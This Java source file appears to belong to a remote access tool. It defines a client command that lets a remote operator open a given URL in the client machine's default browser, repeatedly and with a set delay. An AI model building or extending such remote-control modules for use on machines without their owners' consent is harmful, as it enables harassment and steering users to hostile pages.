package main.java.rat.command.clientCommands;

import main.java.rat.command.ClientCommand;
import main.java.rat.command.IntegerCommandParameter;
import main.java.rat.command.StringCommandParameter;

import java.awt.*;
import java.net.URI;

public class ClientOpenURLCommand extends ClientCommand {
    public ClientOpenURLCommand() {
        this.parameters.add(
                new StringCommandParameter("URL", true, "The URL of the website to launch")
        );
        this.parameters.add(
                new IntegerCommandParameter("count", false, "The amount of times to open the URL", 1)
        );
        this.parameters.add(
                new IntegerCommandParameter("delay", false, "Delay before every launch in milliseconds", 0)
        );
    }

    @Override
    public String getMainCommandName() {
        return "openURL";
    }

    @Override
    public String getHelpText() {
        return "Open the given url X times on the client's browser";
    }

    @Override
    public String getExtendedHelpText() {
        return "Open the given url X times with the client's current default browser with a given delay between";
    }

    @Override
    public boolean executeCommand() {

        String URL = (String) getParameter("URL").getValue();
        int count = (int) getParameter("count").getValue();
        int delay = (int) getParameter("delay").getValue();

        try {
            for(int i = 0; i < count; i++) {
                logger.log("Opening '"+URL+"' "+count+" time(s)");
                Desktop.getDesktop().browse(new URI(URL));
                try {
                    Thread.sleep(delay);
                } catch (InterruptedException e) {
                    this.error = "Unexpected InterruptedException occurred";
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            //TODO: send error feedback to server
            this.error = "Java.awt.Desktop is not supported on this client";
        }
        return false;
    }
}
